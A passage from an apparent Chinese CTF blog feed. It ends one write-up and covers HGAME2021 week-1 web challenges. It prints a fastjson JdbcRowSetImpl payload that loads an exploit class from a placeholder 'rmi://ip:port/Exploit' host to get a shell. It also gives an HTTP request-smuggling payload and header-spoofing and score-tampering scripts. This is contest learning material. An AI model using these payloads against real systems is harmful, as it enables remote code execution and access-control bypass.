string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;</code></pre><p>服务器加载了恶意class文件，成功getshell</p><img src="/article/VN2021ctf/image-20210315140505582.png" class="" title="image-20210315140505582" loading="lazy"><p>编码问题，整了一个小时就是反弹不了shell，原来是java反弹shell的编码问题，去<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">网站</a>编码一下就成功了</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>孩子好菜，被《简单的签到》搞傻了。查阅了不少资料，拜读了很多大佬的博客，虽然最后还是没做出来，等等WP康康大佬的思路也许比自己忙活半天有用，当然少不了原理的研究。</p><p>继续学习啦</p><p>（想结识更多大佬）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;比赛昵称：别答了别答了再答人傻了&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="SQL" scheme="https://err0r.top/tags/SQL/"/>
    
    <category term="JAVA" scheme="https://err0r.top/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>HGAME2021</title>
    <link href="https://err0r.top/article/hgame2021/"/>
    <id>https://err0r.top/article/hgame2021/</id>
    <published>2021-02-06T05:59:51.000Z</published>
    <updated>2021-03-30T11:58:02.290Z</updated>
    
    <content type="html"><![CDATA[<p>HAME2021-week 个人WP</p><p>昵称：Err0r</p><a id="more"></a><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><p>这是week1，做了Web和部分Misc，后续会整合成一篇文章(先让我水着)</p><img src="/article/hgame2021/image-20210206151019347.png" class="" title="image-20210206151019347" loading="lazy"><p><strong>由于某些原因，以后会注重原理上的研究</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>题目描述： 第一次在银河系里搭顺风车，要准备啥，在线等，挺急的 </p><p>题目地址： <a href="http://hitchhiker42.0727.site:42420/">http://hitchhiker42.0727.site:42420</a> </p><img src="/article/hgame2021/image-20210206151406243.png" class="" title="image-20210206151406243" loading="lazy"><p>抓包看看顺风车啥样</p><img src="/article/hgame2021/image-20210206151614330.png" class="" title="image-20210206151614330" loading="lazy"><p>状态码405Method Not Allowed</p><p>对于任何客户端请求都要进行一套流程，即DNS解析域名返回IP，打开IP套接字(socket)连接IP，再通过套接字写HTTP数据流，最后从WEB服务器接受响应的HTTP数据流。而405状态码就是最后一步生成的，即服务器不响应这种请求方式，请求方式有GET/POST/HEAD/PUT等，换成POST看看。</p><blockquote><p>注意:在burpsuite里面，右键改变请求方式即可</p><img src="/article/hgame2021/image-20210206152237254.png" class="" title="change" loading="lazy"></blockquote><p>随后提示<code>只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～</code></p><img src="/article/hgame2021/image-20210206152332459.png" class="" title="image-20210206152332459" loading="lazy"><p>这里只要改UA就行了，User-Agent 简单来说就是告诉服务器访问者是通过什么工具来请求的，添加<code>Infinite Improbability Drive</code>或者直接删掉UA只加这个也可以</p><p>随后提示</p><pre class="language-none"><code class="language-none">你知道吗？&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;github.com&#x2F;wuhan005&quot;&gt;茄子&lt;&#x2F;a&gt;特别要求：你得从他的&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;cardinal.ink&#x2F;&quot;&gt;Cardinal&lt;&#x2F;a&gt;过来</code></pre><img src="/article/hgame2021/image-20210206152624452.png" class="" title="image-20210206152624452" loading="lazy"><p>这里是要改Referer，简单来说就是告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理，用法一般是为了防外连接，直接用<code>&lt;a href=&quot;&quot;&gt;</code>，<code>用Submit或&lt;input type=&quot;image&quot;&gt;提交的表单(POST或GET)</code>，或者<code>使用JavaScript提交的[表单](https://baike.baidu.com/item/表单)(POST或GET)</code>都是会带上Referer，当然伪造也很简单。</p><p>最后提示<code>flag仅能通过本地访问获得</code></p><img src="/article/hgame2021/image-20210206153338355.png" class="" title="image-20210206153338355" loading="lazy"><p>很简单的XFF，XFF就是表示客户端最原始的IP地址，也是很容易伪造</p><img src="/article/hgame2021/image-20210206153608572.png" class="" title="image-20210206153608572" loading="lazy"><p>python脚本如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/2/6 15:57@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://hitchhiker42.0727.site:42420/HitchhikerGuide.php"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span> <span class="token punctuation">:</span> <span class="token string">"Infinite Improbability Drive"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span> <span class="token punctuation">:</span> <span class="token string">"https://cardinal.ink/"</span><span class="token punctuation">,</span>    <span class="token string">"X-Forwarded-For"</span> <span class="token punctuation">:</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">&#125;</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p>看着直观点</p><hr><h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>题目描述： 简单且上头的游戏 </p><p>题目地址 ： <a href="http://watermelon.ryen.xyz:800/">http://watermelon.ryen.xyz:800/</a> </p><p>紧跟潮流的小游戏，作者把源码公开了，所以有很多二创。抢了个一血</p><img src="/article/hgame2021/first.png" class="" title="first" loading="lazy"><p>手快2333</p><img src="/article/hgame2021/image-20210206153657660.png" class="" title="image-20210206153657660" loading="lazy"><p>看到小游戏题，第一眼看js，github搜一圈了解到这个游戏的源码在./src/project.js。但是代码四千行，因为游戏开源，所以很容易能找到分析的源码资料，<a href="https://www.cnblogs.com/xuanyu-10-18/p/14340204.html">参考链接</a>，直接搜到控制分数的代码，改掉</p><img src="/article/hgame2021/image-20210206155153207.png" class="" title="image-20210206155153207" loading="lazy"><p>可以看到这一块3436行<code>default.score</code>是计分块，改成+999999保存，然后把游戏玩结束弹flag</p><img src="/article/hgame2021/image-20210206155459828.png" class="" title="image-20210206155459828" loading="lazy"><hr><h3 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h3><p>题目描述： </p><p><strong>资料：<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></strong><br>宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。<br>为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。<br>调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。<br>这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？ </p><p>题目链接： <a href="http://thief.0727.site/">http://thief.0727.site:80</a> </p><p><strong>hint: 注意留意服务器信息</strong> </p><p>HTTP请求走私，资料里讲的很详细，建议仔细读一下，这里不做过多阐述</p><p>payload：</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: thief.0727.sitePragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.104 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Content-Length: 95Transfer-Encoding: chunked0GET &#x2F;secret HTTP&#x2F;1.1Content-Length: 30Host: thief.0727.siteClient-IP: 127.0.0.11</code></pre><img src="/article/hgame2021/image-20210206161847925.png" class="" title="image-20210206161847925" loading="lazy"><hr><h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><p>题目描述： 又有谁不爱高数呢？反正我不爱（请使用firefox浏览器打开题目） </p><p>题目地址： <a href="http://r4u.top:5000/">http://r4u.top:5000/</a> </p><p>又到了写脚本环节，首先看下题目</p><img src="/article/hgame2021/image-20210206162112398.png" class="" title="image-20210206162112398" loading="lazy"><p>我大概是假的大学生</p><p>先找题目，全是ax+b的形式，那就挺好办的，找源码看看怎么取数字</p><img src="/article/hgame2021/image-20210206162233545.png" class="" title="image-20210206162233545" loading="lazy"><p>应该还是挺好取的，但是开始写脚本发现GET请求不到，应该是对接api的，果然在Sources里面找到了个<code>fuckmath.js</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getStatus"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span><span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> solving <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'solving'</span><span class="token punctuation">]</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#status"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>solving<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>solving <span class="token operator">===</span> <span class="token number">100</span><span class="token punctuation">)</span>                <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        xhrFields<span class="token operator">:</span> <span class="token punctuation">&#123;</span>            withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#integral'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    type<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>    url<span class="token operator">:</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>answer<span class="token operator">:</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#answer'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>    contentType<span class="token operator">:</span> <span class="token string">"application/json;charset=utf-8"</span><span class="token punctuation">,</span>    xhrFields<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-success">\n                    &lt;strong>Right!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-danger">\n                    &lt;strong>Wrong!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>应该是通过<code>./api/getStatus</code>检查做题情况，<code>./api/getQuestion</code>加载题目，<code>./api/verify</code>交答案，最后<code>./api/getFlag</code>拿flag</p><p>直接访问<code>./api/getFlag</code>看看？</p><img src="/article/hgame2021/image-20210206162746009.png" class="" title="image-20210206162746009" loading="lazy"><p>被骂了555…应该是检查session看做题情况，其他都访问一下看看</p><img src="/article/hgame2021/image-20210206162926231.png" class="" title="image-20210206162926231" loading="lazy"><img src="/article/hgame2021/image-20210206162952785.png" class="" title="image-20210206162952785" loading="lazy"><p>最后确认答案是<code>answer</code>，开始写脚本</p><img src="/article/hgame2021/image-20210206163154279.png" class="" title="image-20210206163154279" loading="lazy"><p>赶时间，没搞正则，凑合着用用吧，蹩脚编程勿喷2333</p><p>payload:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/1/30 21:20@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> sympy <span class="token keyword">import</span> symbols<span class="token punctuation">,</span> integrate<span class="token keyword">import</span> jsonurl <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000"</span><span class="token comment"># print(requests.get(url))</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">jifen</span><span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span>    A <span class="token operator">=</span> integrate<span class="token punctuation">(</span>a <span class="token operator">*</span> x <span class="token operator">+</span> b<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> shangxian<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> A<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">"get"</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#123;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\"question\":\"&lt;math>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/math>\"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span> <span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;mrow>"</span><span class="token punctuation">)</span>    <span class="token comment"># print(res)</span>    xiaxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(xiaxian)</span>    shangxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/msubsup>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                           <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(shangxian)</span>    a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mi>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(a)</span>    b <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(b)</span>    ans <span class="token operator">=</span> jifen<span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    upans <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>upans<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        run<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#print(session.cookies)</span></code></pre><p>一 键 获 取 flag</p><img src="/article/hgame2021/image-20210206163540205.png" class="" title="image-20210206163540205" loading="lazy"><hr><h3 id="走私者的愤怒"><a href="#走私者的愤怒" class="headerlink" title="走私者的愤怒"></a>走私者的愤怒</h3><p>题目描述：</p><p> <strong>本题为宝藏走私者的更改版本，考点相同，请先做出宝藏走私者</strong><br>Liki 日记：<br>2020年2月2日：<br>今天警局寄来一封信，是走私者 Switch 寄来的，信里只有一句话<br><strong>“我最讨厌顺风车，我将带来我的愤怒”</strong><br>真是让人摸不着头脑……<br>我看不懂，但我大受震撼。 </p><p>题目描述： <a href="http://police.liki.link/">http://police.liki.link</a> </p><p>原因是web3能上车了2333</p><p>相同payload，改改host就行</p><img 